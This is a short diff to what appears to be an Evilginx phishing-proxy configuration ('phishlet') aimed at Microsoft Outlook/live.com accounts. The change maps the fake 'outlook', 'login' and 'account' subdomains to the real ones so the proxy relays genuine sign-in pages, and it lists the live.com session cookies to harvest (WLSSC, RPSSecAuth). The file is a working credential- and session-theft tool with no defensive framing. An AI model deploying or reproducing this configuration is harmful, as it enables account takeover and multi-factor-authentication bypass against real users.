@@ -1,11 +1,11 @@
 author: '@isloj16'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'outlook', orig_sub: 'academy', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'login', orig_sub: 'academy', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'account', orig_sub: 'academy', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
 sub_filters:
-#  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+#  - {triggers_on: 'login.live.com', orig_sub: 'login', login: 'live.com', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
 auth_tokens:
   - domain: '.live.com'
     keys: ['WLSSC','RPSSecAuth']
